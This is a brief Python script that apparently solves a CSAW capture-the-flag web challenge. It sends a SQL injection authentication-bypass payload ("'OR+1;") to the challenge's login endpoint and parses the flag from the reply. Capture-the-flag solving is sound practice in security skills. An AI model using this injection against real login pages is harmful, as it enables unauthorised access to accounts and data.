import requests
host = 'http://web.chal.csaw.io:5001'
endpoint = '/login'
data = {'username':"'OR+1;",'password':'0'}
r = requests.post(host+endpoint,headers=data,data=data)
flag_idx = r.text.index('flag: ')
end_idx = r.text.index('}</p>')
print('{}'.format(r.text[flag_idx:end_idx+1]))
